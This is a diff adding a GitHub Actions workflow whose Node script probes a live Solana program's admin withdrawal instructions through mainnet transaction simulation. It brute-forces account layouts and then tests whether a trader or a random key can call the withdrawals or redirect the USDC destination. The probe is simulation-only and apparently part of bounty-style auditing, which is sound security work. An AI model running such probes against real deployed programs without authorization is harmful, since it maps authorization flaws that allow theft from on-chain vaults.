@@ -1,0 +1,63 @@
+name: mayhem-withdraw-auth-runtime
+on:
+  push:
+    branches: [audit/boost-runtime-probe-20260815]
+    paths: ['.github/workflows/mayhem-withdraw-auth-runtime.yml']
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 24
+      - run: npm install --no-save @solana/web3.js @solana/spl-token
+      - name: Simulation-only withdraw auth and destination differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import {PublicKey,TransactionInstruction,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {getAssociatedTokenAddressSync,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID} from '@solana/spl-token';
+          import crypto from 'node:crypto';
+          const P=new PublicKey('MAyhSmzXzV1pTf7LsNkrNwkWKTo4ougAJ1PPg47MD4e');
+          const GLOBAL=new PublicKey('13ec7XdrjF3h3YcqBTFDSReRcUFwbCnJaAQspM4j6DDJ');
+          const ADMIN=new PublicKey('FFWtrEQ4B4PKQoVuHYzZq8FabGkVatYzDpEVHsK5rrhF');
+          const TRADER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const RANDOM=new PublicKey('Ce6TQqeHC9p8KetsN6JsjHK7UTZk7nasjjnr7XxXp9F1');
+          const SYSTEM=new PublicKey('11111111111111111111111111111111');
+          const SOL_VAULT=new PublicKey('BwWK17cbHxwWBKZkUYvzxLcNQ1YVyaFezduWbtm2de6s');
+          const USDC=new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
+          const [EVENT]=PublicKey.findProgramAddressSync([Buffer.from('__event_authority')],P);
+          const VAULT_USDC=getAssociatedTokenAddressSync(USDC,SOL_VAULT,true,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const ADMIN_USDC=getAssociatedTokenAddressSync(USDC,ADMIN,false,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const TRADER_USDC=getAssociatedTokenAddressSync(USDC,TRADER,false,TOKEN_PROGRAM_ID,ASSOCIATED_TOKEN_PROGRAM_ID);
+          console.log('DERIVED',JSON.stringify({event:EVENT.toBase58(),vaultUsdc:VAULT_USDC.toBase58(),adminUsdc:ADMIN_USDC.toBase58(),traderUsdc:TRADER_USDC.toBase58()},null,2));
+          const RPCS=['https://rpc.solanatracker.io/public','https://api.mainnet-beta.solana.com','https://solana-rpc.publicnode.com'];let id=1;const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+          async function rpc(method,params){let last;for(const url of RPCS){try{const r=await fetch(url,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-withdraw-auth/1.0'},body:JSON.stringify({jsonrpc:'2.0',id:id++,method,params})});if(!r.ok)throw Error('HTTP '+r.status);const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));return {url,result:j.result}}catch(e){last=e;console.log('RPCFAIL',method,url,String(e).slice(0,160));await sleep(220)}}throw last}
+          const bh=(await rpc('getLatestBlockhash',[{commitment:'processed'}])).result.value.blockhash;
+          const disc=n=>crypto.createHash('sha256').update('global:'+n).digest().subarray(0,8);
+          const dataVariants=n=>[disc(n),Buffer.concat([disc(n),Buffer.alloc(8)]),Buffer.concat([disc(n),Buffer.from([1,0,0,0,0,0,0,0])])];
+          const meta=(pk,s=false,w=false)=>({pubkey:pk,isSigner:s,isWritable:w});
+          const solLayouts={
+            a_g_sys_v_evt_prog:(a)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(SOL_VAULT,false,true),meta(EVENT),meta(P)],
+            a_g_v_sys_evt_prog:(a)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SOL_VAULT,false,true),meta(SYSTEM),meta(EVENT),meta(P)],
+            a_v_g_sys_evt_prog:(a)=>[meta(a,true,true),meta(SOL_VAULT,false,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(EVENT),meta(P)],
+            a_g_sys_evt_prog_v:(a)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(EVENT),meta(P),meta(SOL_VAULT,false,true)],
+            a_g_sys_evt_prog:(a)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(EVENT),meta(P)]
+          };
+          const quoteLayouts={
+            a_g_sys_v_m_vata_tok_ata_aata_evt_prog:(a,aata=ADMIN_USDC)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(SOL_VAULT,false,true),meta(USDC),meta(VAULT_USDC,false,true),meta(TOKEN_PROGRAM_ID),meta(ASSOCIATED_TOKEN_PROGRAM_ID),meta(aata,false,true),meta(EVENT),meta(P)],
+            a_g_v_m_vata_tok_ata_aata_sys_evt_prog:(a,aata=ADMIN_USDC)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SOL_VAULT,false,true),meta(USDC),meta(VAULT_USDC,false,true),meta(TOKEN_PROGRAM_ID),meta(ASSOCIATED_TOKEN_PROGRAM_ID),meta(aata,false,true),meta(SYSTEM),meta(EVENT),meta(P)],
+            a_g_sys_v_m_vata_tok_ata_aata:(a,aata=ADMIN_USDC)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SYSTEM),meta(SOL_VAULT,false,true),meta(USDC),meta(VAULT_USDC,false,true),meta(TOKEN_PROGRAM_ID),meta(ASSOCIATED_TOKEN_PROGRAM_ID),meta(aata,false,true)],
+            a_g_v_m_vata_tok_ata_aata_evt_prog:(a,aata=ADMIN_USDC)=>[meta(a,true,true),meta(GLOBAL,false,true),meta(SOL_VAULT,false,true),meta(USDC),meta(VAULT_USDC,false,true),meta(TOKEN_PROGRAM_ID),meta(ASSOCIATED_TOKEN_PROGRAM_ID),meta(aata,false,true),meta(EVENT),meta(P)]
+          };
+          async function sim(name,label,keys,data){const ix=new TransactionInstruction({programId:P,keys,data});const msg=new TransactionMessage({payerKey:TRADER,recentBlockhash:bh,instructions:[ix]}).compileToV0Message();const tx=new VersionedTransaction(msg);const {url,result}=await rpc('simulateTransaction',[Buffer.from(tx.serialize()).toString('base64'),{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed'}]);const v=result?.value,logs=v?.logs??[];console.log('SIM',JSON.stringify({name,label,rpc:url,err:v?.err??null,units:v?.unitsConsumed??null,interesting:logs.filter(x=>/Instruction:|AnchorError|Error Code|Error Number|caused by account|Left:|Right:|failed|success|Rate limit|Permission|constraint/.test(x)).slice(-30)},null,2));return {v,logs}}
+          function parserish(r){const t=r.logs.join('\n');return /AccountNotEnoughKeys|InvalidProgramId|AccountOwnedByWrongProgram|AccountDiscriminator|ConstraintSeeds|ConstraintAddress|ConstraintAssociated|ConstraintToken|InstructionDidNotDeserialize/.test(t)}
+          async function find(name,layouts){for(const [ln,fn] of Object.entries(layouts)){for(const [di,data] of dataVariants(name).entries()){const r=await sim(name,ln+' data'+di,fn(ADMIN),data);if(!parserish(r)){console.log('VIABLE',name,ln,di);return {ln,di,fn}}}}return null}
+          const sol=await find('withdraw_admin',solLayouts);
+          if(sol){const data=dataVariants('withdraw_admin')[sol.di];console.log('=== WITHDRAW_ADMIN AUTH ===');await sim('withdraw_admin','admin',sol.fn(ADMIN),data);await sim('withdraw_admin','trader',sol.fn(TRADER),data);await sim('withdraw_admin','random',sol.fn(RANDOM),data)}
+          const quote=await find('withdraw_quote_admin',quoteLayouts);
+          if(quote){const data=dataVariants('withdraw_quote_admin')[quote.di];console.log('=== WITHDRAW_QUOTE AUTH/DEST ===');await sim('withdraw_quote_admin','admin_correct_dest',quote.fn(ADMIN,ADMIN_USDC),data);await sim('withdraw_quote_admin','trader_own_dest',quote.fn(TRADER,TRADER_USDC),data);await sim('withdraw_quote_admin','random_with_admin_dest',quote.fn(RANDOM,ADMIN_USDC),data);await sim('withdraw_quote_admin','admin_redirect_to_trader_ata',quote.fn(ADMIN,TRADER_USDC),data)}
+          NODE
